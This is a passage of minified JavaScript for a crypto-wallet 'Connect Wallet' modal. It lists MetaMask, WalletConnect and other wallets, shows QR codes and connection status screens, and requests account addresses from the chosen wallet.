                  animation: qrPulse 1.5s infinite;
                }
              `,document.head.appendChild(g)}}).catch(l=>{console.error("Error generating QR-code (URL):",l),a.innerHTML=`
              <div style="color: #ff4d4d; text-align: center; padding: 20px; background: rgba(255, 77, 77, 0.1); border-radius: 8px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <p style="margin-top: 10px; font-weight: 500;">  QR-</p>
              </div>
            `,setTimeout(()=>{rl()},100)})}catch(c){console.error("Error generating QR-code:",c),a.innerHTML=`
            <div style="word-break: break-all; font-size: 12px; padding: 10px; text-align: center;">
              <p>QR-code not generated. Use URI:</p>
              <code style="background: #f0f0f0; padding: 5px; display: block; margin-top: 10px;">${o}</code>
            </div>
          `,setTimeout(()=>{rl()},100)}}}),n.on("disconnect",o=>{console.log("WalletConnect disconnect event:",o),el();const a=Yt.querySelector("#confirmation_step #status-container");a&&(a.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",Yt.querySelectorAll(".dot").forEach((l,u)=>{l.classList.remove("active"),u===0&&l.classList.add("active")}),Cn("Connection Cancelled"),Xc({type:"danger",title:"Connection Cancelled",description:"Connection was cancelled by user",icon:r.info.icon,showButton:!0,buttonText:"Try again"})}),n.on("session_request_fail",o=>{console.log("WalletConnect session request failed:",o),el();const a=Yt.querySelector("#confirmation_step #status-container");a&&(a.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",Yt.querySelectorAll(".dot").forEach((l,u)=>{l.classList.remove("active"),u===0&&l.classList.add("active")}),Cn("Connection Failed"),Xc({type:"danger",title:"Connection Failed",description:"Request was rejected by wallet",icon:r.info.icon,showButton:!0,buttonText:"Try again"})}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(o=>{if(o&&o.length>0){el();const a=Yt.querySelector("#confirmation_step #status-container");a&&(a.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",s.forEach((c,l)=>{c.classList.remove("active"),l===2&&c.classList.add("active")}),Cn("Connection Successful"),Xc({type:"success",title:"Connection Successful",description:"Your wallet has been connected",icon:r.info.icon,showSuccess:!0}),setTimeout(()=>{G4(),i({provider:n,walletAddress:o[0],name:r.info.name})},1500)}}).catch(o=>{console.error("Failed to get accounts:",o),el();const a=Yt.querySelector("#confirmation_step #status-container");a&&(a.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",s.forEach((c,l)=>{c.classList.remove("active"),l===0&&c.classList.add("active")}),Cn("Connection Failed"),Xc({type:"danger",title:"Connection Failed",description:"Please try again or choose another wallet",icon:r.info.icon,showButton:!0,buttonText:"Try again"})})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),el();const s=Yt.querySelector("#confirmation_step #status-container");s&&(s.innerHTML=""),Yt.querySelector("#confirmation_step").style.display="flex",Yt.querySelectorAll(".dot").forEach((l,u)=>{l.classList.remove("active"),u===0&&l.classList.add("active")});let a="Connection Failed",c="Failed to initialize WalletConnect. Please try again.";n.message?.includes("User rejected")||n.message?.includes("rejected")||n.message?.includes("denied")?(a="Connection Cancelled",c="Connection was cancelled by user",Cn("Connection Cancelled")):((n.message?.includes("timeout")||n.message?.includes("Timeout"))&&(a="Connection Timeout",c="Connection timed out. Please try again."),Cn("Connection Failed")),Xc({type:"danger",title:a,description:c,icon:r.info.icon,showButton:!0,buttonText:"Try again"}),setTimeout(()=>{rl()},100)}}function AYe(r=[]){el(),Fie(),Cn("Steps");const e=Yt.querySelector("#confirmation_step #status-container");e.innerHTML="";const t=localStorage.getItem("lastConnectedWallet");if(Yt.querySelector("#confirmation_step").style.display="flex",r.length>0){let n=function(){if(i<r.length){const s=r[i];Xc({type:s.type,title:s.title,description:s.description,icon:t}),i++,i<r.length&&setTimeout(n,3e3)}},i=0;n()}setTimeout(()=>{rl()},150)}function IYe(r){const e=localStorage.getItem("lastConnectedWallet");Xc({type:r.type,title:r.title,description:r.description,icon:e})}function TYe(r){const e=Yt.querySelector("#modal_connect");e.classList.contains("active")||e.classList.add("active"),e.classList.remove("large"),el(),Yt.querySelector("#confirmation_step").style.display="flex",Cn("Screen"),Xc(r),setTimeout(()=>{rl()},150)}function DO(){L1("all_wallets_step"),kYe(),Cn("All Wallets"),zie();const r=Yt.querySelector("#all_wallets_step input[placeholder='Search wallet']");r&&(r.value=""),PYe()}function kYe(){const r=Yt.querySelector("#all_wallets_grid");r&&(r.innerHTML=eP.map(e=>`
    <div class="dark:bg-white/2 bg-black/2 hover:bg-white/5 h-fit wallet-grid-item flex flex-col gap-2 items-center p-3 px-2 rounded-xl transition-all duration-200 cursor-pointer" data-wallet-id="${e.id}">
      <img src="${e.icon}" alt="${e.name}" class="w-12 h-12 rounded-xl" onerror="this.style.display='none'; this.parentNode.querySelector('.wallet-placeholder-grid').style.display='flex'">
      <div class="wallet-placeholder-grid" style="display: none; width: 48px; height: 48px; border-radius: 12px; background: linear-gradient(135deg, #667DFF 0%, #5A6BF5 100%); color: white; font-weight: 600; font-size: 16px; align-items: center; justify-content: center;">
        ${e.name.charAt(0)}
      </div>
      <div class="flex gap-1 items-center">
        <p class="text-nowrap text-xs font-medium text-center">${e.name}</p>
        <svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M6.99996 14.2167C3.45613 14.2167 0.583293 11.3438 0.583293 7.8C0.583293 4.25617 3.45613 1.38333 6.99996 1.38333C10.5438 1.38333 13.4166 4.25617 13.4166 7.8C13.4166 11.3438 10.5438 14.2167 6.99996 14.2167Z" fill="#202020" />
          <path d="M7.00004 14.5083C3.29513 14.5083 0.291708 11.5049 0.291708 7.80001C0.291708 4.0951 3.29513 1.09167 7.00004 1.09167C10.705 1.09167 13.7084 4.0951 13.7084 7.80001C13.7084 11.5049 10.705 14.5083 7.00004 14.5083Z" stroke="#C7B994" stroke-opacity="0.7" stroke-width="0.583333" />
          <path d="M9.01382 7.25668L9.76918 6.50597C8.06194 4.80923 5.94053 4.80923 4.23328 6.50597L4.98865 7.25668C6.28709 5.96626 7.71625 5.96626 9.0147 7.25668H9.01382Z" fill="#C7B994" />
          <path d="M8.76158 9.00576L6.99997 7.25494L5.2383 9.00576L3.47666 7.25494L2.72217 8.00482L5.2383 10.5063L6.99997 8.75551L8.76158 10.5063L11.2777 8.00482L10.5232 7.25494L8.76158 9.00576Z" fill="#C7B994" />
        </svg>
      </div>
    </div>
  `).join(""),r.querySelectorAll(".wallet-grid-item").forEach(e=>{e.addEventListener("click",()=>{const t=e.dataset.walletId,i=eP.find(n=>n.id===t);console.log(e.dataset,i),i&&NYe()})}))}function NYe(r){qie()}function qie(){const r=Yt.querySelector("#modal_connect");r.classList.contains("active")||r.classList.add("active"),L1("what_is_wallet_step"),Cn("What Is A Wallet?")}function PYe(){const r=Yt.querySelector("#all_wallets_step input[placeholder='Search wallet']");r&&(r.replaceWith(r.cloneNode(!0)),Yt.querySelector("#all_wallets_step input[placeholder='Search wallet']").addEventListener("input",t=>{const i=t.target.value.toLowerCase(),n=Yt.querySelectorAll(".wallet-grid-item");let s=0;n.forEach(o=>{o.querySelector("p").textContent.toLowerCase().includes(i)?(o.style.display="flex",s++):o.style.display="none"}),zie(s)}))}function zie(r=null){const e=Yt.querySelector("#wallet-count");if(e){const t=r!==null?r:eP.length;e.textContent=t}}window.handleRetryClick=function(){const r=Yt.querySelector(".status_text")?.textContent;Yt.querySelector(".screen-button")?.textContent?.trim()==="Go back"?DO():r==="Error"||r==="Screen"?(el(),Wie()):G4()};function el(){["connect_wallet_step","confirmation_step","walletConnect_step","all_wallets_step","what_is_wallet_step"].forEach(e=>{const t=Yt.querySelector(`#${e}`);t&&(t.style.display="none")}),setTimeout(()=>{rl()},50)}function Wie(){L1("connect_wallet_step"),Cn("Connect Wallet")}function $Ye(){const r=["connect_wallet_step","confirmation_step","walletConnect_step","all_wallets_step","what_is_wallet_step"];for(const e of r){const t=Yt.querySelector(`#${e}`);if(t&&t.style.display!=="none")return e}return null}function Hie(r){const e=Yt.querySelector("#back_button"),t=Yt.querySelector("#help_button");r==="connect_wallet_step"?(e&&(e.style.display="none"),t&&(t.style.display="flex")):(e&&(e.style.display="flex"),t&&(t.style.display="none"))}function L1(r){el();const e=Yt.querySelector(`#${r}`);e&&(e.style.display="flex",Hie(r),setTimeout(()=>{const t=Yt.querySelector("#modal_connect .modal-content");t?mYe(t):rl()},50))}function RYe(){L1("connect_wallet_step"),Cn("Connect Wallet")}window.handleRetryClick=RYe;function OYe(){const r=$Ye();r==="what_is_wallet_step"?(L1("all_wallets_step"),Cn("All Wallets")):(L1("connect_wallet_step"),Cn("Connect Wallet"))}const BYe=Object.freeze(Object.defineProperty({__proto__:null,addStatusBlock:IYe,disconnectWallet:xYe,hideModal:G4,initModal:CYe,openModal:Fie,showAllWallets:DO,showInfoScreen:AYe,showSingleScreen:TYe,showWhatIsWalletPage:qie},Symbol.toStringTag,{value:"Module"})),Vie=document.createElement("div");document.body.appendChild(Vie);const Kie=Vie.attachShadow({mode:"open"}),Wr=document.createElement("html");Kie.appendChild(Wr);function Gie(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/modal1and2/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/modal1and2/wallet_connect.png",walletId:"walletconnect",uuid:""},provider:null}),e}function Zie(r){let e=document.createElement("div");return e.id="wallet-list",e.innerHTML="",[...r].sort((n,s)=>n.info.name==="MetaMask"?-1:s.info.name==="MetaMask"?1:n.info.name==="Rabby Wallet"?-1:s.info.name==="Rabby Wallet"||n.info.walletId==="walletconnect"?1:s.info.walletId==="walletconnect"?-1:n.info.name.localeCompare(s.info.name)).slice(0,6).forEach(n=>{const s=document.createElement("div");s.dataset.walletId=n.info.walletId,s.dataset.walletName=n.info.name,s.dataset.walletIcon=n.info.icon,s.dataset.providerIndex=r.findIndex(u=>u.info.name===n.info.name&&u.info.walletId===n.info.walletId),n.info.walletId==="walletconnect"?s.className="wallet-link wallet-link-connector":s.className="wallet-link";const o=document.createElement("img");o.className="w-12 h-12",o.src=n.info.icon||"./assets/modal1and2/metamask.png",o.alt=n.info.name||"Wallet",s.appendChild(o);const a=document.createElement("div");a.className="flex flex-col gap-2";const c=document.createElement("p");c.className="text-base dark:text-white text-black font-semibold",c.textContent=n.info.name||"Wallet",a.appendChild(c);const l=document.createElement("p");l.className="text-sm text-[#7C7A85]",n.info.name==="MetaMask"||n.info.name==="Rabby Wallet"?l.textContent="Recommended":l.textContent="Installed",n.info.walletId!=="walletconnect"&&a.appendChild(l),s.appendChild(a),e.appendChild(s)}),e}async function MYe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function i0(){const r=Wr.querySelector("#awaiting_confirmation_step"),e=Wr.querySelector("#awaiting_success_step"),t=Wr.querySelector("#connection_failed_step"),i=Wr.querySelector("#connect_wallet_step"),n=Wr.querySelector("#additional_info_step"),s=Wr.querySelector("#walletConnect_step");r&&(r.style.display="none"),e&&(e.style.display="none"),t&&(t.style.display="none"),i&&(i.style.display="none"),n&&(n.style.display="none"),s&&(s.style.display="none")}function LO(){const r=Wr.querySelector("#connect_wallet_step");r.style.display="flex"}function DYe(r){const e=Wr.querySelector("#awaiting_confirmation_step");e&&(e.style.display="flex"),Wr.querySelectorAll("#wallet_selected_name").forEach(t=>{t.textContent=r.name}),Wr.querySelectorAll(".wallet-link_info").forEach(t=>{switch(r.name){case"MetaMask":t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":t.href="https://www.coinbase.com/wallet",t.target="_blank",t.textContent="Don't have Coinbase Wallet?";break;case"Phantom":t.href="https://phantom.app/",t.target="_blank",t.textContent="Don't have Phantom?";break;case"Rabby Wallet":t.href="https://rabby.io/",t.target="_blank",t.textContent="Don't have Rabby Wallet?";break;default:t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have Wallet?"}}),Wr.querySelectorAll(".image_connected_wallet").forEach(t=>{t.src=r.icon})}function Yie(){Wr.querySelector("#awaiting_confirmation_step").style.display="none",Wr.querySelector("#awaiting_success_step").style.display="flex"}function tP(){Wr.querySelector("#awaiting_confirmation_step").style.display="none";const r=Wr.querySelector("#connection_failed_step");return r.style.display="flex",r}async function LYe(r,e,t,i){if(r.info.walletId==="walletconnect"){HYe(r.info),await VYe(r,e,t,i);return}i0(),DYe(r.info);try{const n=await MYe(r,e,t);n.success&&(Yie(),setTimeout(()=>{iE(),i({provider:n.provider,walletAddress:n.accounts[0],name:r.info.name})},1500))}catch(n){console.error("Connection error:",n);const o=tP().querySelector(".btn.btn-primary");o&&(o.onclick=()=>{i0(),LO()})}}async function UYe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function Jie(r,e){return new Promise((t,i)=>{const n=Wr.querySelector("#modal_connect"),s=Wr.querySelector("#wallet-list-container");setTimeout(()=>{n.classList.add("active")},100);const o=Gie(),a=Zie(o);s&&(s.innerHTML="",s.appendChild(a)),Wr.querySelectorAll(".wallet-link").forEach(c=>{c.addEventListener("click",async()=>{const l=parseInt(c.dataset.providerIndex);!isNaN(l)&&o[l]?await LYe(o[l],r,e,t):console.error("Provider not found for this wallet link")})})})}function jYe(){const r=Wr.querySelector(".left_side"),e=Wr.querySelector(".modal-content");r.style.display="none",e.classList.add("small")}function Qie(){const r=Wr.querySelector(".left_side");r.style.display="flex",Wr.querySelector(".modal-content").classList.remove("small")}function UO(r,e){const t=[{name:"MetaMask",icon:"./assets/modal1and2/metamask.png",bg_image:"lines-primary",status:"loading",title:e,description:"Waiting for Connection",showBtn:!1,showBackBtn:!1},{name:"MetaMask",icon:"./assets/modal1and2/metamask.png",bg_image:"lines-confirm",status:"confirm",title:e,description:"Approve the Connection to Continue",showBtn:!1,showBackBtn:!1},{name:"MetaMask",icon:"./assets/modal1and2/metamask.png",bg_image:"lines-error",status:"error",title:e,description:"",showBtn:!0,showBackBtn:!0}],i=t.find(l=>l.status===r),n=Wr.querySelector("#additional_info_image"),s=Wr.querySelector("#additional_info_title"),o=Wr.querySelector("#additional_info_description");n.classList.remove("lines-primary","lines-success","lines-error"),n.classList.add(i.bg_image),s.textContent=i.title,o.textContent=" ";const a=Wr.querySelector("#additional_info_step .return_default_step svg");a.classList.add("!hidden"),i.showBackBtn&&a.classList.remove("!hidden");const c=Wr.querySelector("#additional_info_btn");return c.classList.add("!hidden"),i.showBtn&&c.classList.remove("!hidden"),t}async function iE(){Wr.querySelector("#modal_connect").classList.remove("active"),setTimeout(()=>{i0(),LO(),Qie()},100)}async function FYe(r,e,t=!1){const i=await KYe(),n=document.createElement("div"),s=document.createElement("div");t&&Kie.querySelector("html").classList.add("dark"),s.id="wallet-list",s.className="flex flex-col gap-1 h-full",n.appendChild(s),n.innerHTML=`<style>${i}</style>
<div id="modal_connect" class="modal-content">
  <div class="modal-connect border border-[#DBD8E0] dark:border-[#262830]  w-full h-full rounded-4xl dark:bg-[#131418] bg-white">
      <div class="flex items-start  h-full">
        <div
        class="left_side p-6 border-r dark:border-[#262830] border-[#DBD8E0] max-w-[300px] flex flex-col gap-6 w-full h-full">
          <p class="text-2xl dark:text-white text-black font-semibold">Connect Wallet</p>
        <div id="wallet-list-container" class="flex flex-col gap-1 h-full">
          ${s.innerHTML}
        </div>
      </div>
      <div id="connect_wallet_step" class="p-6  w-full h-full  justify-center items-center flex-col gap-11">
        <div class="flex flex-col h-full justify-center items-center gap-10">


     <svg class="pulse-svg" width="147" height="150" viewBox="0 0 147 150" fill="none"
              xmlns="http://www.w3.org/2000/svg">
              <path
                d="M68.5242 0.5C71.9974 0.5 75.4748 0.5 78.9479 0.5C81.9499 0.984558 84.9936 1.27861 87.9414 1.98681C118.983 9.4167 137.867 28.8652 145.284 59.525C146.055 62.7139 146.38 66.0064 146.91 69.2534V80.4355C146.484 83.1399 146.105 85.8568 145.63 88.5529C140.506 117.635 118.287 141.021 89.3591 147.706C85.7942 148.531 82.1417 148.977 78.5309 149.599H68.1073C65.8517 149.255 63.5876 148.969 61.3444 148.559C31.1117 143.047 8.05866 120.699 1.79613 90.7892C1.10817 87.5009 0.68705 84.1629 0.14502 80.8455C0.14502 77.1182 0.14502 73.3907 0.14502 69.6634C0.570305 66.9589 0.953895 64.2463 1.42088 61.546C6.46593 32.6175 28.7601 9.08951 57.5002 2.4548C61.1318 1.61821 64.8468 1.14194 68.5242 0.5ZM111.078 12.3075C111.095 12.2784 111.111 12.2453 111.132 12.2164C111.086 12.2371 111.044 12.2536 110.999 12.2743C110.994 12.2123 110.99 12.1542 110.986 12.0921C111.019 12.1626 111.049 12.2371 111.082 12.3075H111.078ZM28.9727 132.991C29.0102 132.999 29.052 133.004 29.0894 133.012C29.0561 133.037 29.0269 133.062 28.9936 133.086C29.0061 133.058 29.0185 133.029 29.031 132.999C28.9143 132.781 28.7934 132.561 28.6766 132.341C26.1749 129.989 24.3362 126.936 21.1341 125.325C21.0966 125.346 21.0549 125.366 21.0173 125.384C21.0715 125.376 21.1258 125.371 21.1799 125.363C21.2592 125.727 21.2134 126.219 21.4343 126.436C23.4565 128.386 25.5078 130.304 27.5967 132.184C27.8177 132.382 28.3098 132.274 28.6766 132.312C28.7726 132.535 28.8684 132.763 28.9685 132.988L28.9727 132.991ZM31.7412 14.7634L31.3201 15.2935C31.2784 15.5503 31.2409 15.8071 31.1991 16.0638C30.8364 16.0638 30.4738 16.0679 30.111 16.0721C29.9942 16.3164 29.8774 16.5608 29.7565 16.801L29.6482 16.8342L29.7148 16.7431C29.84 16.4946 29.965 16.2419 30.0943 15.9934C30.4528 16.0059 30.8156 16.0182 31.1742 16.0348C31.2034 15.7656 31.2326 15.4965 31.2618 15.2273C31.3993 15.0823 31.5328 14.9415 31.6703 14.7965C31.6828 14.8256 31.6954 14.8587 31.7079 14.8876C31.7204 14.8462 31.7287 14.8007 31.7412 14.7593V14.7634ZM122.193 128.66C122.364 128.593 122.539 128.522 122.711 128.457C123.369 128.005 124.137 127.648 124.675 127.082C126.421 125.222 128.127 123.317 129.769 121.362C130.587 120.389 131.232 119.27 131.954 118.219C130.658 118.952 129.361 119.68 128.064 120.414C128.01 120.446 127.968 120.513 127.931 120.571C126.2 123.209 124.47 125.852 122.744 128.49L122.156 128.696L122.235 128.813L122.193 128.66ZM91.3938 3.87948C91.3938 3.85463 91.3938 3.82978 91.3938 3.80494C91.373 3.81736 91.3479 3.83393 91.327 3.84635C91.548 3.87534 91.7648 3.90432 91.9858 3.93332C91.7856 3.91676 91.5897 3.89605 91.3896 3.87948H91.3938ZM109.114 10.6964C109.051 10.6964 108.985 10.6881 108.922 10.7006C108.893 10.7047 108.872 10.7461 108.851 10.771C108.951 10.7296 109.051 10.6881 109.152 10.6467C109.268 10.8869 109.377 11.1354 109.518 11.3674C109.539 11.4005 109.702 11.3466 109.798 11.3301C109.573 11.1189 109.343 10.9076 109.118 10.6923L109.114 10.6964ZM99.5033 143.175C98.4777 143.539 97.4478 143.892 96.4305 144.277C96.2595 144.343 96.147 144.558 96.0093 144.707C96.1636 144.761 96.3637 144.902 96.4638 144.853C97.4812 144.323 98.4818 143.764 99.4867 143.213C99.5367 143.196 99.5909 143.163 99.6368 143.167C99.6785 143.172 99.7202 143.221 99.7577 143.246C99.6701 143.221 99.5868 143.196 99.4992 143.175H99.5033ZM94.3165 5.48639L94.3749 5.43669V5.44912C94.6876 5.75973 94.9462 6.23187 95.3214 6.35197C98.4109 7.3625 101.517 8.31091 104.623 9.25931C104.824 9.32144 105.07 9.25103 105.291 9.23861C105.099 9.05224 104.932 8.81203 104.707 8.68364C101.463 6.91107 98.0357 5.7266 94.3124 5.48224L94.3165 5.48639ZM34.4514 13.0944C34.8391 13.1109 35.2894 13.2601 35.6105 13.1192C38.8918 11.6738 42.1607 10.1912 45.4171 8.69192C45.8382 8.49728 46.2135 8.17424 46.547 7.84706C46.7846 7.61513 46.9097 7.27552 47.0848 6.98148C46.7096 7.01461 46.2801 6.94006 45.9716 7.09745C42.119 9.07709 38.2873 11.094 34.4514 13.0985C34.4806 13.1482 34.5098 13.1979 34.5431 13.2435C34.5764 13.2849 34.6223 13.318 34.664 13.3511L34.4514 13.0944ZM10.3727 109.956C10.3268 109.998 10.2768 110.043 10.231 110.085C10.281 110.039 10.3352 109.993 10.3852 109.948C10.4478 110.515 10.3519 111.161 10.5979 111.634C13.5874 117.333 17.0898 122.608 22.9896 125.802C22.9812 125.81 22.9728 125.819 22.9687 125.83C22.7686 125.21 22.6351 124.559 22.3599 123.967C21.3217 121.731 20.321 119.473 19.1411 117.311C18.6199 116.355 17.811 115.481 16.948 114.798C14.8132 113.112 12.5701 111.559 10.3727 109.956ZM26.5419 129.082C26.592 129.028 26.642 128.974 26.692 128.916C26.6461 128.962 26.5961 129.008 26.5503 129.052C26.8004 129.285 27.1048 129.484 27.2924 129.761C31.1991 135.455 36.9322 138.305 43.4115 139.986C43.8452 140.098 44.3164 140.065 44.7708 140.102C44.5874 139.746 44.4247 139.374 44.2204 139.03C43.4115 137.663 42.6861 136.234 41.7396 134.966C41.1768 134.213 40.3594 133.468 39.4964 133.145C35.8607 131.787 32.1707 130.573 28.4848 129.351C27.872 129.148 27.1882 129.165 26.5377 129.077L26.5419 129.082ZM80.1028 99.3456C83.7761 99.3456 86.5572 99.3084 89.334 99.3622C90.5474 99.3871 91.0644 99.0019 91.0936 97.7222C91.1812 93.7215 91.3395 89.7208 91.5397 85.7242C91.6064 84.374 91.1477 84.0137 89.776 83.964C82.0041 83.699 74.2364 83.3469 66.4687 82.9411C65.1887 82.8748 64.5882 83.0695 64.5007 84.4859C64.2505 88.4783 63.9254 92.4707 63.5126 96.4508C63.3666 97.8588 63.8836 98.2399 65.1887 98.3185C70.4588 98.6374 75.7207 99.035 80.0987 99.3415L80.1028 99.3456ZM80.2112 83.1937C82.8255 83.1937 86.0193 83.1151 89.2048 83.2268C90.9393 83.289 91.6939 82.8707 91.5981 80.9615C91.4063 77.1761 91.3812 73.3825 91.4146 69.593C91.4271 67.924 90.8934 67.4063 89.1506 67.3566C82.15 67.1661 75.1537 66.8264 68.1615 66.4289C66.7856 66.3502 66.3603 66.7146 66.2394 68.0316C65.8517 72.2145 65.393 76.3975 64.8717 80.5681C64.7134 81.8436 65.272 82.0921 66.3478 82.1666C70.7758 82.4689 75.2038 82.821 80.2154 83.1979L80.2112 83.1937ZM63.5751 85.6621C63.6084 85.335 63.6168 84.7054 63.7418 84.1048C63.9712 83.0073 63.4583 82.6968 62.4452 82.5229C54.9318 81.2307 47.4267 79.8971 39.9259 78.5262C39.0169 78.3605 38.4749 78.3648 38.3498 79.4457C37.8453 83.6866 37.2574 87.9192 36.8322 92.1684C36.7862 92.6447 37.4868 93.5807 37.9621 93.6676C45.6589 95.1255 53.3723 96.4715 61.0818 97.8588C62.2367 98.066 62.6745 97.66 62.7454 96.4674C62.9538 92.9594 63.2749 89.4557 63.5751 85.6621ZM62.1408 82.0342C63.6668 82.1997 63.9962 81.4625 64.1213 80.1704C64.5216 75.9917 64.9844 71.817 65.5139 67.6507C65.6723 66.3957 65.1178 66.1845 64.0671 66.0064C57.2417 64.8427 50.4246 63.6416 43.6242 62.3661C42.5318 62.1589 42.1065 62.4158 41.8772 63.418C40.9223 67.5761 39.9509 71.73 38.9627 75.8798C38.7125 76.9359 38.9335 77.5572 40.1219 77.7849C47.4643 79.1806 54.8025 80.6136 62.1449 82.0383L62.1408 82.0342ZM78.6019 114.272C82.0667 114.272 84.8435 114.222 87.6162 114.292C88.9588 114.326 89.6426 113.961 89.7551 112.507C90.0345 108.937 90.3973 105.372 90.8101 101.814C90.9602 100.522 90.5474 100.182 89.259 100.137C81.2244 99.8468 73.1899 99.4947 65.1595 99.0765C63.8419 99.006 63.2749 99.267 63.2248 100.65C63.0998 104.229 62.908 107.807 62.6619 111.381C62.5702 112.685 62.9705 113.183 64.3423 113.261C69.3248 113.547 74.2989 113.957 78.5976 114.272H78.6019ZM92.3485 91.6714H92.236C92.1234 93.6676 92.0525 95.668 91.8857 97.66C91.7899 98.7949 92.0942 99.3374 93.3451 99.2132C100.658 98.4719 107.976 97.7843 115.284 96.985C115.802 96.927 116.627 96.107 116.64 95.6266C116.74 91.3567 116.686 87.0826 116.678 82.8127C116.678 81.9679 116.353 81.6282 115.398 81.7276C108.155 82.4773 100.908 83.1813 93.6578 83.8605C92.7029 83.9516 92.3193 84.2995 92.3402 85.2645C92.3861 87.4015 92.3528 89.5385 92.3528 91.6756L92.3485 91.6714ZM92.1818 75.0598C92.2485 75.0598 92.3152 75.0598 92.382 75.0598C92.382 77.1968 92.4278 79.3379 92.361 81.475C92.3277 82.589 92.5946 83.173 93.8537 83.0446C100.963 82.3282 108.072 81.6282 115.185 80.9531C116.272 80.8496 116.594 80.3402 116.457 79.3214C115.86 75.0184 115.289 70.7112 114.714 66.4082C114.588 65.4722 114.167 65.2195 113.167 65.3272C106.683 66.023 100.191 66.6566 93.6953 67.2406C92.5654 67.3441 92.1026 67.663 92.1526 68.8517C92.2401 70.9182 92.1776 72.989 92.1776 75.0556L92.1818 75.0598ZM62.1366 105.715C62.1366 105.715 62.1449 105.715 62.1492 105.715C62.2534 103.86 62.3159 101.996 62.4827 100.145C62.5702 99.18 62.2409 98.8321 61.2777 98.6706C53.5641 97.3495 45.8548 95.9993 38.158 94.5912C36.978 94.3758 36.4819 94.5912 36.4861 95.8337C36.4944 99.619 36.4069 103.408 36.4861 107.194C36.4986 107.72 37.1865 108.598 37.6827 108.689C45.2336 110.122 52.8053 111.447 60.3729 112.806C61.4486 113 61.8656 112.574 61.8781 111.489C61.9073 109.563 62.0449 107.637 62.1366 105.711V105.715ZM80.499 51.2129C76.3128 50.9023 73.2566 50.7532 70.2254 50.4136C68.9537 50.2727 68.5159 50.5834 68.3699 51.8425C67.8989 55.8805 67.3609 59.9142 66.7398 63.9316C66.5312 65.2776 67.019 65.6129 68.2407 65.6626C75.308 65.9526 82.3752 66.2714 89.4424 66.6152C90.8392 66.6856 91.2478 66.1348 91.1311 64.793C90.7766 60.7425 90.4681 56.688 90.2388 52.6293C90.1679 51.3869 89.5842 51.184 88.521 51.2005C85.4689 51.246 82.4169 51.2171 80.499 51.2171V51.2129ZM94.8377 114.284C100.883 113.535 106.929 112.772 112.979 112.044C113.971 111.923 114.656 111.654 114.809 110.507C115.319 106.759 115.898 103.019 116.457 99.2752C116.627 98.1322 116.318 97.7346 115.014 97.8754C107.855 98.6458 100.692 99.3622 93.516 99.9669C92.0567 100.091 91.6522 100.625 91.573 101.942C91.4146 104.552 91.1853 107.161 90.8809 109.757C90.3639 114.193 90.3305 114.189 94.8377 114.284ZM67.6444 50.8857C67.6695 50.2727 67.6695 50.2811 66.1477 50.0078C60.4229 48.9807 54.6942 47.9826 48.9819 46.8933C47.8728 46.6821 47.3559 46.9347 47.0015 47.9949C45.6755 51.9791 44.2996 55.9466 42.8903 59.9018C42.5235 60.9331 42.7403 61.4342 43.8327 61.6247C50.7207 62.8257 57.6003 64.0682 64.5007 65.2071C64.8968 65.2734 65.7724 64.6439 65.8349 64.2505C66.4853 59.9639 67.019 55.661 67.6487 50.8857H67.6444ZM96.0969 66.5945C101.538 65.9526 106.979 65.3231 112.42 64.6646C113.363 64.5486 114.455 64.5694 114.017 63.008C112.85 58.825 111.741 54.6255 110.627 50.4302C110.382 49.4984 109.848 49.3327 108.935 49.4321C103.489 50.0202 98.0398 50.5959 92.582 51.0555C91.3103 51.1632 90.8975 51.5111 91.0311 52.7867C91.3646 56.0088 91.6314 59.2392 91.8274 62.4737C92.0734 66.5283 92.0317 66.5324 96.0969 66.5903V66.5945ZM37.4909 78.402C37.2866 78.2777 36.7488 77.818 36.1316 77.5903C30.532 75.5527 24.9033 73.5854 19.312 71.5188C18.3322 71.1585 17.8027 71.0011 17.6109 72.256C16.9897 76.3478 16.2809 80.4231 15.7055 84.519C15.6304 85.0492 15.9973 86.0348 16.3976 86.1839C22.4933 88.4783 28.6183 90.6857 34.7682 92.8393C35.0309 92.9305 35.8565 92.3506 35.8981 92.0152C36.4569 87.7081 36.9239 83.3843 37.4909 78.3979V78.402ZM37.5785 77.0974C37.7578 76.6667 38.0287 76.2069 38.1496 75.7141C39.142 71.5644 40.0426 67.3897 41.1141 63.2565C41.4311 62.0347 40.9891 61.7655 39.9801 61.4135C34.8183 59.6285 29.6607 57.8145 24.5531 55.8846C23.4148 55.4538 22.952 55.5947 22.5809 56.6963C21.2508 60.6763 19.8958 64.6521 18.5073 68.6156C18.0945 69.7917 18.5032 70.4006 19.6164 70.794C25.2243 72.7778 30.8198 74.7864 36.4235 76.7827C36.682 76.8738 36.9572 76.9276 37.5826 77.0933L37.5785 77.0974ZM77.0008 127.193C80.082 127.193 82.863 127.139 85.6357 127.218C86.8615 127.251 87.3702 126.795 87.5578 125.632C88.0539 122.567 88.5835 119.511 89.1922 116.467C89.4383 115.241 88.9087 115.116 87.8872 115.075C79.9819 114.76 72.0808 114.413 64.1797 114.015C63.0373 113.957 